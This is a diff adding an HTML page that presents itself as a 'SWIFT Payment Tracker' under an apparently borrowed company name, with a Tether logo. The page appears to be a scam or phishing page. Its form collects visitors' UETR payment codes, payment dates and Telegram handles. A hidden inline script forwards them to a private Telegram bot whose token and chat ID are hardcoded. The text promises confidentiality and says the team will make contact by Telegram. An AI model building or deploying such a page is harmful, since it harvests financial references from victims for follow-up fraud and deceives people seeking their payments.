@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>SWIFT Payment Tracker</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+      background: #f4f6f9;
+      color: #222;
+    }
+    header {
+      background: linear-gradient(135deg, #1a73e8, #0059c1);
+      color: #fff;
+      padding: 20px;
+      text-align: center;
+    }
+    header h1 {
+      margin: 0;
+      font-size: 2rem;
+    }
+    .container {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 30px;
+      padding: 40px 10%;
+    }
+    .form-section, .info-section {
+      flex: 1;
+      min-width: 300px;
+    }
+    .form-section {
+      background: #fff;
+      padding: 25px;
+      border-radius: 12px;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.08);
+    }
+    .form-section h2 {
+      margin-top: 0;
+      font-size: 1.4rem;
+      color: #0059c1;
+    }
+    label {
+      display: block;
+      margin-top: 15px;
+      font-weight: 600;
+    }
+    input, textarea {
+      width: 100%;
+      padding: 10px;
+      margin-top: 6px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      font-size: 1rem;
+    }
+    input[type="date"] {
+      cursor: pointer;
+    }
+    button {
+      margin-top: 20px;
+      padding: 12px;
+      background: #1a73e8;
+      border: none;
+      border-radius: 8px;
+      color: #fff;
+      font-size: 1rem;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+    button:hover {
+      background: #0059c1;
+    }
+    .info-section {
+      display: flex;
+      align-items: center;
+      font-size: 1.1rem;
+      line-height: 1.6;
+    }
+    .steps {
+      padding: 40px 10%;
+    }
+    .steps h2 {
+      text-align: center;
+      color: #0059c1;
+      margin-bottom: 25px;
+    }
+    .step {
+      background: #fff;
+      border-radius: 12px;
+      padding: 20px;
+      margin-bottom: 15px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+      display: flex;
+      align-items: center;
+      gap: 15px;
+    }
+    .step img {
+      width: 40px;
+      height: 40px;
+    }
+    .faq {
+      padding: 40px 10%;
+      background: #fff;
+    }
+    .faq h2 {
+      text-align: center;
+      margin-bottom: 25px;
+      color: #0059c1;
+    }
+    details {
+      background: #f8f9fc;
+      border-radius: 8px;
+      padding: 15px 20px;
+      margin-bottom: 15px;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+    summary {
+      font-weight: 600;
+      list-style: none;
+      position: relative;
+    }
+    summary::after {
+      content: "▼";
+      position: absolute;
+      right: 0;
+      transition: transform 0.3s;
+    }
+    details[open] summary::after {
+      transform: rotate(-180deg);
+    }
+    footer {
+      background: #f4f6f9;
+      text-align: center;
+      padding: 30px 10px;
+      font-size: 0.9rem;
+      color: #444;
+    }
+    footer img {
+      width: 70px;
+      margin-bottom: 10px;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>SWIFT Payment Tracker</h1>
+  </header>
+
+  <div class="container">
+    <!-- Left: Check your payment form -->
+    <div class="form-section">
+      <h2>Check Your Payment</h2>
+      <form id="paymentForm">
+        <label for="uetr">UETR Code</label>
+        <input type="text" id="uetr" placeholder="Enter your UETR code" required />
+
+        <label for="date">Date of Payment</label>
+        <input type="date" id="date" required />
+
+        <label for="telegram">Your Telegram</label>
+        <input type="text" id="telegram" placeholder="@username" required />
+
+        <button type="submit">Check</button>
+      </form>
+    </div>
+
+    <!-- Right: Info section -->
+    <div class="info-section">
+      <p>
+        We provide a professional SWIFT payment analysis.  
+        By entering your UETR and payment date, we help you trace your transaction within the SWIFT network.  
+        Our tool offers clarity, transparency, and guidance to better understand your international payment journey.
+      </p>
+    </div>
+  </div>
+
+  <!-- Steps -->
+  <div class="steps">
+    <h2>Steps to Track Your Payment</h2>
+    <div class="step">
+      <img src="https://cdn-icons-png.flaticon.com/512/1828/1828469.png" alt="Step 1">
+      <p>Enter your unique UETR code and payment date in the form.</p>
+    </div>
+    <div class="step">
+      <img src="https://cdn-icons-png.flaticon.com/512/709/709496.png" alt="Step 2">
+      <p>Submit your Telegram contact for secure communication.</p>
+    </div>
+    <div class="step">
+      <img src="https://cdn-icons-png.flaticon.com/512/1827/1827504.png" alt="Step 3">
+      <p>We analyze your SWIFT transaction and locate it in the system.</p>
+    </div>
+    <div class="step">
+      <img src="https://cdn-icons-png.flaticon.com/512/1040/1040230.png" alt="Step 4">
+      <p>Receive detailed feedback and guidance from our team.</p>
+    </div>
+  </div>
+
+  <!-- FAQ -->
+  <div class="faq">
+    <h2>Frequently Asked Questions</h2>
+    <details>
+      <summary>What is a UETR code?</summary>
+      <p>A Unique End-to-End Transaction Reference used to trace SWIFT payments.</p>
+    </details>
+    <details>
+      <summary>How long does it take to trace a payment?</summary>
+      <p>In most cases, analysis is done within minutes, but complex cases may take longer.</p>
+    </details>
+    <details>
+      <summary>Can I track payments without a UETR?</summary>
+      <p>No, UETR is required to identify and analyze the transaction.</p>
+    </details>
+    <details>
+      <summary>Is my data safe?</summary>
+      <p>Yes, all information is handled with strict confidentiality.</p>
+    </details>
+    <details>
+      <summary>Do you charge for the analysis?</summary>
+      <p>Basic analysis is free. Additional services may require a fee.</p>
+    </details>
+    <details>
+      <summary>What if my payment is delayed?</summary>
+      <p>We provide insights into possible delays and guide you on the next steps.</p>
+    </details>
+    <details>
+      <summary>Can I contact support directly?</summary>
+      <p>Yes, we will reach you via the Telegram handle you provide.</p>
+    </details>
+  </div>
+
+  <!-- Footer -->
+  <footer>
+    <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" alt="USDT Logo">
+    <p>Copyright © 2022-2024. Ohmyfin Limited, registered under the laws of Germany.</p>
+  </footer>
+
+  <!-- Telegram Script -->
+  <script>
+    const BOT_TOKEN = "8362151121:AAH8YM8RA9gDSsaT6S4maBYosv1UNSBYfVk"; // твой токен
+    const CHAT_ID = "6604908241"; // твой ID
+    const URL_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+    document.getElementById("paymentForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+
+      let uetr = document.getElementById("uetr").value;
+      let date = document.getElementById("date").value;
+      let telegram = document.getElementById("telegram").value;
+
+      let text = `🔎 New SWIFT Request:%0A💳 UETR: ${uetr}%0A📅 Date: ${date}%0A📨 Telegram: ${telegram}`;
+
+      fetch(`${URL_API}?chat_id=${CHAT_ID}&text=${text}&parse_mode=HTML`)
+        .then(response => {
+          if (response.ok) {
+            alert("✅ Request sent successfully!");
+            document.getElementById("paymentForm").reset();
+          } else {
+            alert("❌ Error while sending!");
+          }
+        })
+        .catch(err => alert("⚠️ Network error: " + err));
+    });
+  </script>
+</body>
+</html>
